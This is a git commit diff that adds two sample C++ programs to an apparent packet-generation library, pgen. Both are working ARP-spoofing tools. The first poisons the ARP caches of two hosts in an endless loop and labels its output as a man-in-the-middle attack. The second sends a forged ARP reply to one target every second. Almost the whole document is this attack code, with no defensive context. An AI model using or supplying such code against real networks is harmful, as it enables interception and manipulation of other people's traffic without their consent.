0eb3d7e77db48e574cd89fe36b147dcb6af5aa7a
slank-x250 <slank.dev@gmail.com>
2015-05-20 12:11:29 +0900

    some codes edited at 2015.05.20-12:11

---
+++ sample/ARPSPOOF/test2/main.cc
@@ -0,0 +1,46 @@
+#include "pgen.h"
+
+const char* dev = "eth0";
+
+
+int main(int argc,char** argv){
+	if(argc != 5){
+		printf("usage: %s target1IP target1MAC target2IP target2MAC\n", argv[0]);
+		return -1;
+	}
+
+	pgen_arp pack_to_target2;
+	pgen_arp pack_to_target1;
+	
+	pack_to_target2.ETH.src = pgen_getMAC(dev);
+	pack_to_target2.ETH.dst = argv[2];
+	pack_to_target2.ARP.srcEth = pgen_getMAC(dev);
+	pack_to_target2.ARP.srcIp  = argv[3];
+	pack_to_target2.ARP.dstEth = argv[2];
+	pack_to_target2.ARP.dstIp  = argv[1];
+	pack_to_target2.ARP.option = PGEN_ARPOP_REPLY;
+
+	pack_to_target1.ETH.src = pgen_getMAC(dev);
+	pack_to_target1.ETH.dst = argv[4];
+	pack_to_target1.ARP.srcEth = pgen_getMAC(dev);
+	pack_to_target1.ARP.srcIp  = pgen_getIP(dev);
+	pack_to_target1.ARP.srcIp  = argv[1];
+	pack_to_target1.ARP.dstEth = argv[4];
+	pack_to_target1.ARP.dstIp  = argv[3];
+	pack_to_target1.ARP.option = PGEN_ARPOP_REPLY;
+
+
+
+	for(int i=0; ; i++){
+		printf("0x%04x: %s[%s] <MITM Attack> %s[%s] \n", i, 
+				pack_to_target1.ARP.dstIp.c_str(),
+				pack_to_target1.ARP.dstEth.c_str(),
+				pack_to_target2.ARP.dstIp.c_str(),
+				pack_to_target2.ARP.dstEth.c_str() );
+
+		pack_to_target1.sendPack(dev);
+		pack_to_target2.sendPack(dev);
+		sleep(1);
+	}
+}
+
---
+++ sample/ARPSPOOF/test_0519/main.cc
@@ -0,0 +1,34 @@
+#include "pgen.h"
+#include <stdio.h>
+#define DEV "eth0"
+
+int main(int argc,char** argv){
+	if(argc != 5){
+		printf("usage: %s targetIP targetMAC ipaddr macaddr\n", 
+				argv[0]);
+		return -1;
+	}
+
+	pgen_arp pack;
+	
+	pack.ETH.src = argv[4];
+	pack.ETH.dst = argv[2];
+	pack.ARP.srcEth = argv[4];
+	pack.ARP.srcIp  = argv[3];
+	pack.ARP.dstEth = argv[2];
+	pack.ARP.dstIp  = argv[1];
+	pack.ARP.option = PGEN_ARPOP_REPLY;
+	
+	printf("\n");
+	for(int i=0; ; i++){
+		printf("0x%03x: %s[%s] -ARP-REPLY-SPOOF-> %s[%s]\n", i, 
+				pack.ARP.srcIp.c_str(),
+				pack.ARP.srcEth.c_str(),
+				pack.ARP.dstIp.c_str(),
+				pack.ARP.dstEth.c_str() );
+
+		pack.sendPack(DEV);
+		sleep(1);
+	}
+}
+
